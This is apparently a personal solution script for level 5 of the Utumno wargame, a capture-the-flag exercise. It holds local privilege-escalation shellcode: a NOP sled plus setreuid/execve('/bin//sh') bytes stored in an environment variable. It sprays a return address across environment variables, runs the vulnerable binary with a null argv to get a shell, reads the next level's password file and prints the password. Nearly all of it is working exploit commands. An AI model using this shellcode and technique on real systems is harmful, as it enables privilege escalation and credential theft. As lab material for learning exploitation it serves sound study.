# Eactly same as utumno2 lmao

mkdir /tmp/utumno5_ballban
cd /tmp/utumno5_ballban

# Create utumno5_execv.c and compile it
# It will run utumno5 with null argv
nano utumno5_execv.c
gcc -m32 utumno5_execv.c -o utumno5_execv

# Create check_env.c and compile it
# It will check the address of environment variables
nano check_env.c
gcc -m32 check_env.c -o check_env

# Clear the environment variables
unset $(env | awk -F= '{print $1}') && env
# Set the environment variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin; export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# Get EGG's address
./check_env EGG
# Set random environment variables to address of EGG
TARGET=$(python3 -c "import sys; sys.stdout.buffer.write(b'\xff\xff\x6b\xdb'*100)")
for i in {A..Z}; do
    export $i=$TARGET
done

# Run the program
./utumno5_execv

bash -l
cat /etc/utumno_pass/utumno6
# Password: aGlKWrixsh